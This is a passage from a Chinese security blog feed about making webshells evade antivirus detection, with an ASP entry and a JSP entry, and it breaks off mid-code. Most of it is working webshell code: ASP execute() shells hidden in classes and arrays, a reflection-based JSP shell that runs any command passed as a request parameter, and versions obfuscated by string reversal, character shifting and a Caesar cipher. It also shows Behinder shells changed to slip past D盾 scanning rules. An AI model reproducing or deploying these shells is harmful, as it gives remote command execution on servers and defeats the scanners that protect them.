class="hljs-meta">x</span>())<br>eXecUTe(y)<br>%&gt;<br></code></pre></td></tr></table></figure><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><p>在类中定义执行函数，在外部接收参数，可做到一定程度的免杀。</p><p>单独在类中定义目前也会被报一级可疑，所以这里采用了类+数组的方式</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">&lt;%<br><span class="hljs-keyword">Class</span> zzz<br><br><span class="hljs-keyword">private</span> yyy<br>    <span class="hljs-keyword">Private</span> <span class="hljs-keyword">Sub</span> <span class="hljs-keyword">Class_Initialize</span><br>    yyy = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">property</span> <span class="hljs-keyword">let</span> www(yyy)<br>    <span class="hljs-keyword">execute</span>(yyy)<br>    <span class="hljs-keyword">end</span> <span class="hljs-keyword">property</span><br><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Class</span><br><br><span class="hljs-keyword">Set</span> xxx= <span class="hljs-keyword">New</span> zzz<br><span class="hljs-keyword">dim</span> vvv(<span class="hljs-number">7</span>)<br>vvv(<span class="hljs-number">2</span>)=<span class="hljs-built_in">request</span>(<span class="hljs-string">&quot;99999&quot;</span>)<br>xxx.www= vvv(<span class="hljs-number">2</span>)<br>%&gt;<br></code></pre></td></tr></table></figure><h3 id="混合方式"><a href="#混合方式" class="headerlink" title="混合方式"></a>混合方式</h3><p>以上几种都是单一的思路，实战中可以混合以上的多种方式并增加注释、无意义的赋值、字符串处理、加密、编码等，就可以产生更多种免杀木马，随用随写。</p><p>如</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">&lt;%<br>&lt;!--<br><span class="hljs-keyword">Class</span> zzz<br><br><span class="hljs-keyword">private</span> yyy<br>    <span class="hljs-keyword">Private</span> <span class="hljs-keyword">Sub</span> <span class="hljs-keyword">Class_Initialize</span><br>    yyy = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">property</span> <span class="hljs-keyword">let</span> www(yyy)<br>    <span class="hljs-keyword">execute</span>(yyy)<br>    <span class="hljs-keyword">end</span> <span class="hljs-keyword">property</span><br><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Class</span><br><br><span class="hljs-keyword">Set</span> xxx= <span class="hljs-keyword">New</span> zzz<br><span class="hljs-keyword">dim</span> vvv(<span class="hljs-number">7</span>)<br>vvv(<span class="hljs-number">2</span>)=<span class="hljs-built_in">request</span>(<span class="hljs-string">&quot;99999&quot;</span>)&amp;<span class="hljs-string">&quot;&quot;</span><br>xxx.www= vvv(<span class="hljs-number">2</span>)<br>--&gt;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="冰蝎改造"><a href="#冰蝎改造" class="headerlink" title="冰蝎改造"></a>冰蝎改造</h2><p>冰蝎默认马</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;%<br>Response.CharSet = <span class="hljs-string">&quot;UTF-8&quot;</span> <br>k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span> &#x27;该密钥为连接密码<span class="hljs-number">32</span>位md5值的前<span class="hljs-number">16</span>位，默认连接密码rebeyond<br><span class="hljs-constructor">Session(<span class="hljs-string">&quot;k&quot;</span>)</span>=k<br>size=Request.TotalBytes<br>content=Request.<span class="hljs-constructor">BinaryRead(<span class="hljs-params">size</span>)</span><br>For i=<span class="hljs-number">1</span> To size<br>result=result&amp;<span class="hljs-constructor">Chr(<span class="hljs-params">ascb</span>(<span class="hljs-params">midb</span>(<span class="hljs-params">content</span>,<span class="hljs-params">i</span>,1)</span>) Xor <span class="hljs-constructor">Asc(Mid(<span class="hljs-params">k</span>,(<span class="hljs-params">i</span> <span class="hljs-params">and</span> 15)</span>+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<br>Next<br>execute(result)<br>%&gt;<br></code></pre></td></tr></table></figure><p>直接查杀报已知后门</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_bypass/asp_01.png"></p><p>通过二分法发现，查杀规则在</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">result=result&amp;<span class="hljs-constructor">Chr(<span class="hljs-params">ascb</span>(<span class="hljs-params">midb</span>(<span class="hljs-params">content</span>,<span class="hljs-params">i</span>,1)</span>) Xor <span class="hljs-constructor">Asc(Mid(<span class="hljs-params">k</span>,(<span class="hljs-params">i</span> <span class="hljs-params">and</span> 15)</span>+<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<br></code></pre></td></tr></table></figure><p>将其替换为result=1则不报告木马，所以需要对此句代码进行修改</p><p>然后仅尝试用最简单的增加一遍赋值，并拆开“&amp;”就绕过了规则</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;%<br>Response.CharSet = <span class="hljs-string">&quot;UTF-8&quot;</span> <br><span class="hljs-attribute">k</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span><br>Session(<span class="hljs-string">&quot;k&quot;</span>)=k<br><span class="hljs-attribute">size</span>=Request.TotalBytes<br><span class="hljs-attribute">content</span>=Request.BinaryRead(size)<br><span class="hljs-keyword">For</span> <span class="hljs-attribute">i</span>=1 <span class="hljs-keyword">To</span> size<br><span class="hljs-attribute">t</span>=Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i <span class="hljs-keyword">and</span> 15)+1,1)))<br><span class="hljs-attribute">tt</span>=result&amp;t<br><span class="hljs-attribute">result</span>=tt<br>Next<br>execute(result)<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_bypass/asp_02.png"></p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/webshell_bypass/asp_03.png"></p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://www.w3school.com.cn/vbscript/vbscript_ref_functions.asp">https://www.w3school.com.cn/vbscript/vbscript_ref_functions.asp</a></p>]]></content>
    
    
    <categories>
      
      <category>bypass</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>webshell免杀研究jsp篇</title>
    <link href="/2021/05/12/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6jsp%E7%AF%87/"/>
    <url>/2021/05/12/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6jsp%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>向服务器端发送恶意代码写成的文件(即：shell)，客户端通过远程连接，利用shell连接到服务器，并可对服务器进行操作。</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>实现三步</p><ol><li>数据的传递</li><li>执行所传递的数据</li><li>回显</li></ol><h3 id="数据传递"><a href="#数据传递" class="headerlink" title="数据传递"></a>数据传递</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">String x = request.getParameter(<span class="hljs-string">&quot;x&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="执行所传递的数据"><a href="#执行所传递的数据" class="headerlink" title="执行所传递的数据"></a>执行所传递的数据</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">Class</span> rt = <span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>Method <span class="hljs-keyword">gr</span> = rt.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);  <span class="hljs-comment">//获取getRuntime方法</span><br>Method <span class="hljs-keyword">ex</span> = rt.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.<span class="hljs-keyword">class</span>);  <span class="hljs-comment">//获取exec方法</span><br>Process <span class="hljs-keyword">e</span> = (Process) <span class="hljs-keyword">ex</span>.invoke(<span class="hljs-keyword">gr</span>.invoke(null),  x);<br></code></pre></td></tr></table></figure><h3 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#in为执行返回结果</span><br><span class="hljs-keyword">int</span> a=<span class="hljs-number">-1</span>;<br><span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];<br>out.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br><span class="hljs-keyword">while</span>((a=in.<span class="hljs-built_in">read</span>(b))!=<span class="hljs-number">-1</span>)&#123;<br>    out.<span class="hljs-built_in">println</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in"><span class="hljs-keyword">String</span></span>(b));<br>&#125;<br>out.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="免杀思路"><a href="#免杀思路" class="headerlink" title="免杀思路"></a>免杀思路</h2><p>jsp类型webshell数据传入、回显两个部分都是很正常的代码，一般程序中都会使用，不会触发检测规则。</p><p>所以需要重点关注杀毒软件对执行这个部分的检测</p><h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>将以上三个部分拼接出来就是正常的通过类反射执行的回显webshell：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs arduino">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>  language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span>%&gt;<br>&lt;%<br><span class="hljs-keyword">String</span> x = request.<span class="hljs-built_in">getParameter</span>(<span class="hljs-string">&quot;x&quot;</span>);<br><span class="hljs-keyword">if</span>(x!=null)&#123;<br>Class rt = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>Method gr = rt.<span class="hljs-built_in">getMethod</span>(<span class="hljs-string">&quot;getRuntime&quot;</span>);  <span class="hljs-comment">//获取getRuntime方法</span><br>    Method ex = rt.<span class="hljs-built_in">getMethod</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">String</span>.class);  <span class="hljs-comment">//获取exec方法</span><br><span class="hljs-built_in">Process</span> e = (<span class="hljs-built_in">Process</span>) ex.<span class="hljs-built_in">invoke</span>(gr.<span class="hljs-built_in">invoke</span>(null),  x);<br>java.io.InputStream in = e.<span class="hljs-built_in">getInputStream</span>();<br><span class="hljs-keyword">int</span> a = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];<br>out.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br><span class="hljs-keyword">while</span>((a=in.<span class="hljs-built_in">read</span>(b))!=<span class="hljs-number">-1</span>)&#123;<br>out.<span class="hljs-built_in">println</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in"><span class="hljs-keyword">String</span></span>(b));<br>&#125;<br>out.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>由于其仍然含有java.lang.Runtime、getRuntime、exec等关键字，仍然会被安全软件检测，我们的免杀主要也针对这几个关键字符串。</p><p>比如通过ascii、hex、base64等方式传入不含有这些特征的关键字，但是因为用的过多，目前也被列入已知后门，所以最好这里是自定义编码方式或转换方式，比如异或，移位，反转，栅栏等各种操作缝合的方式。</p><h3 id="反转字符串"><a href="#反转字符串" class="headerlink" title="反转字符串"></a>反转字符串</h3><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs processing">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>  language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span>%&gt;<br>&lt;%!<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">String</span> reverseStr(<span class="hljs-keyword">String</span> <span class="hljs-built_in">str</span>)&#123;<span class="hljs-keyword">String</span> <span class="hljs-built_in">reverse</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-built_in">int</span> length = <span class="hljs-built_in">str</span>.length();<span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; length; i++)&#123;<span class="hljs-built_in">reverse</span> = <span class="hljs-built_in">str</span>.charAt(i) + <span class="hljs-built_in">reverse</span>;&#125;<span class="hljs-keyword">return</span> <span class="hljs-built_in">reverse</span>;&#125;%&gt;<br>&lt;%<br><span class="hljs-keyword">String</span> x = request.getParameter(<span class="hljs-string">&quot;x&quot;</span>);<br><span class="hljs-keyword">if</span>(x!=<span class="hljs-keyword">null</span>)&#123;<br>Class rt = Class.forName(reverseStr(<span class="hljs-string">&quot;emitnuR.gnal.avaj&quot;</span>));<br>Method gr = rt.getMethod(reverseStr(<span class="hljs-string">&quot;emitnuRteg&quot;</span>));<br>    Method ex = rt.getMethod(reverseStr(<span class="hljs-string">&quot;cexe&quot;</span>), <span class="hljs-keyword">String</span>.class);<br>Process e = (Process) ex.invoke(gr.invoke(<span class="hljs-keyword">null</span>),  x);<br>java.io.InputStream in = e.getInputStream();<br><span class="hljs-built_in">int</span> a = <span class="hljs-number">-1</span>;<br><span class="hljs-built_in">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[<span class="hljs-number">2048</span>];<br>out.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br><span class="hljs-keyword">while</span>((a=in.read(b))!=<span class="hljs-number">-1</span>)&#123;<br>out.<span class="hljs-built_in">println</span>(<span class="hljs-keyword">new</span> <span class="hljs-keyword">String</span>(b));<br>&#125;<br>out.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h3 id="移位5位"><a href="#移位5位" class="headerlink" title="移位5位"></a>移位5位</h3><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs processing">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>  language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span>%&gt;<br>&lt;%!<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">String</span> eStr(<span class="hljs-keyword">String</span> <span class="hljs-built_in">str</span>)&#123;<span class="hljs-keyword">String</span> result = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-built_in">int</span> length = <span class="hljs-built_in">str</span>.length();<span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; length; i++)&#123;<span class="hljs-built_in">char</span> z=<span class="hljs-built_in">str</span>.charAt(i);z=(<span class="hljs-built_in">char</span>)(z<span class="hljs-number">-5</span>);result=result+z;&#125;<span class="hljs-keyword">return</span> result;&#125;%&gt;<br>&lt;%<br><span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;x&quot;</span>)!=<span class="hljs-keyword">null</span>)&#123;Class rt = Class.forName(eStr(<span class="hljs-string">&quot;of&#123;f3qfsl3Wzsynrj&quot;</span>));<br>Process e = (Process) rt.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-keyword">String</span>(eStr(<span class="hljs-string">&quot;j&#125;jh&quot;</span>)), <span class="hljs-keyword">String</span>.class).invoke(rt.getMethod(<span class="hljs-keyword">new</span> <span class="hljs-keyword">String</span>(eStr(<span class="hljs-string">&quot;ljyWzsynrj&quot;</span>))).invoke(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">Object</span>[]&#123;&#125;), request.getParameter(<span class="hljs-string">&quot;x&quot;</span>) );<br>java.io.InputStream in = e.getInputStream();<span class="hljs-built_in">int</span> a = <span class="hljs-number">-1</span>;<span class="hljs-built_in">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[<span class="hljs-number">2048</span>];<br>out.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<span class="hljs-keyword">while</span>((a=in.read(b))!=<span class="hljs-number">-1</span>)&#123;out.<span class="hljs-built_in">println</span>(<span class="hljs-keyword">new</span> <span class="hljs-keyword">String</span>(b));&#125;out.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h3 id="小写字母凯撒密码"><a href="#小写字母凯撒密码" class="headerlink" title="小写字母凯撒密码"></a>小写字母凯撒密码</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gradle">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>  language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span>%&gt;<br>&lt;%!<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String plusStr(String str)&#123;String <span class="hljs-keyword">plus</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">int</span> length = str.length();<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; length; i++)&#123;<span class="hljs-keyword">char</span> z = str.charAt(i);<br><span class="hljs-keyword">if</span>(z&gt;=<span class="hljs-string">&#x27;a&#x27;</span>&amp;&amp;z&lt;=<span class="hljs-string">&#x27;w&#x27;</span>)&#123;z=(<span class="hljs-keyword">char</span>)(z+<span class="hljs-number">3</span>);<span class="hljs-keyword">plus</span>=<span class="hljs-keyword">plus</span>+z;&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(z&gt;=<span class="hljs-string">&#x27;x&#x27;</span>&amp;&amp;z&lt;=<span class="hljs-string">&#x27;z&#x27;</span>)&#123;z=(<span class="hljs-keyword">char</span>)(z-<span class="hljs-number">23</span>);<span class="hljs-keyword">plus</span>=<span class="hljs-keyword">plus</span>+z;&#125;<br><span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">plus</span>=<span class="hljs-keyword">plus</span>+z;&#125;&#125;<span class="hljs-keyword">return</span> <span class="hljs-keyword">plus</span>;&#125;<br>%&gt;<br>&lt;%<br>String x = request.getParameter(<span class="hljs-string">&quot;x&quot;</span>);<br><span class="hljs-keyword">if</span>(x!=<span class="hljs-keyword">null</span>)&#123;<br><span class="hljs-keyword">Class</span> rt = <span class="hljs-keyword">Class</span>.forName(plusStr(<span class="hljs-string">&quot;gxsx.ixkd.Rrkqfjb&quot;</span>));<br>Method gr = rt.getMethod(plusStr(<span class="hljs-string">&quot;dbqRrkqfjb&quot;</span>));<br>    Method ex = rt.getMethod(plusStr(<span class="hljs-string">&quot;bubz&quot;</span>), String.<span class="hljs-keyword">class</span>);<br>Process e = (Process) ex.invoke(gr.invoke(<span class="hljs-keyword">null</span>),  x);<br>java.io.InputStream in = e.getInputStream();<br><span class="hljs-keyword">int</span> a = -<span class="hljs-number">1</span>;<br><span class="hljs-keyword">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">2048</span>];<br>out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br><span class="hljs-keyword">while</span>((a=in.<span class="hljs-keyword">read</span>(b))!=-<span class="hljs-number">1</span>)&#123;<br>out.<span class="hljs-keyword">println</span>(<span class="hljs-keyword">new</span> String(b));<br>&#125;<br>out.<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="冰蝎改造"><a href="#冰蝎改造" class="headerlink" title="冰蝎改造"></a>冰蝎改造</h2><p>冰蝎默认马：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;%@page import=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;<br>&lt;%!<span class="hljs-keyword">class</span> U extends ClassLoader&#123;<span class="hljs-constructor">U(ClassLoader <span class="hljs-params">c</span>)</span>&#123;super(c);&#125;<br>public Class g(byte <span class="hljs-literal">[]</span>b)&#123;return super.define<span class="hljs-constructor">Class(<span class="hljs-params">b</span>,0,<span class="hljs-params">b</span>.<span class="hljs-params">length</span>)</span>;&#125;&#125;%&gt;<br>&lt;%<span class="hljs-keyword">if</span> (request.get<span class="hljs-constructor">Method()</span>.equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<span class="hljs-comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>session.put<span class="hljs-constructor">Value(<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-params">k</span>)</span>;<br>Cipher c=<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Cipher</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;AES&quot;</span>)</span>;<br>c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-constructor">SecretKeySpec(<span class="hljs-params">k</span>.<span class="hljs-params">getBytes</span>()</span>,<span class="hljs-string">&quot;AES&quot;</span>));<br><span class="hljs-keyword">new</span> <span class="hljs-constructor">U(<span class="hljs-params">this</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>).g(c.<span class="hljs-keyword">do</span><span class="hljs-constructor">Final(<span class="hljs-params">new</span> <span class="hljs-params">sun</span>.<span class="hljs-params">misc</span>.BASE64Decoder()</span>.decode<span class="hljs-constructor">Buffer(<span class="hljs-params">request</span>.<span class="hljs-params">getReader</span>()</span>.read<span class="hljs-constructor">Line()</span>))).<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.equals(pageContext);&#125;%&gt;<br></code></pre></td></tr></table></figure><p>经过二分法，D盾查杀特征在最后这句</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">new</span> <span class="hljs-constructor">U(<span class="hljs-params">this</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>).g(c.<span class="hljs-keyword">do</span><span class="hljs-constructor">Final(<span class="hljs-params">new</span> <span class="hljs-params">sun</span>.<span class="hljs-params">misc</span>.BASE64Decoder()</span>.decode<span class="hljs-constructor">Buffer(<span class="hljs-params">request</span>.<span class="hljs-params">getReader</span>()</span>.read<span class="hljs-constructor">Line()</span>))).<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>.equals(pageContext);<br></code></pre></td></tr></table></figure><p>参考了yzddmr6的方法，拆分或使用类似语句替换，所以使用Base64.getDecoder()替换原本特征，并把request.getReader().readLine()单独取出来，破坏D盾识别的特征。当然也可以拆分该语句的其他部分，破坏特征。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&lt;%@page import=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;<br>&lt;%!<span class="hljs-keyword">class</span> U extends ClassLoader&#123;<span class="hljs-constructor">U(ClassLoader <span class="hljs-params">c</span>)</span>&#123;super(c);&#125;<br>public Class g(byte <span class="hljs-literal">[]</span>b)&#123;return super.define<span class="hljs-constructor">Class(<span class="hljs-params">b</span>,0,<span class="hljs-params">b</span>.<span class="hljs-params">length</span>)</span>;&#125;&#125;%&gt;<br>&lt;%<span class="hljs-keyword">if</span> (request.get<span class="hljs-constructor">Method()</span>.equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;<br>String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<br>session.put<span class="hljs-constructor">Value(<span class="hljs-string">&quot;u&quot;</span>,<span class="hljs-params">k</span>)</span>;<br>Cipher c=<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Cipher</span>.</span></span>get<span class="hljs-constructor">Instance(<span class="hljs-string">&quot;AES&quot;</span>)</span>;<br>c.init(<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-constructor">SecretKeySpec(<span class="hljs-params">k</span>.<span class="hljs-params">getBytes</span>()</span>,<span class="hljs-string">&quot;AES&quot;</span>));<br>String input= request.get<span class="hljs-constructor">Reader()</span>.read<span class="hljs-constructor">Line()</span>;<br><span class="hljs-keyword">new</span> <span class="hljs-constructor">U(<span class="hljs-params">this</span>.<span class="hljs-params">getClass</span>()</span>.get<span class="hljs-constructor">ClassLoader()</span>).g(c.<span class="hljs-keyword">do</span><span class="hljs-constructor">Final(Base64.<span class="hljs-params">getDecoder</span>()</span>.decode(input))).<span class="hljs-keyword">new</span><span 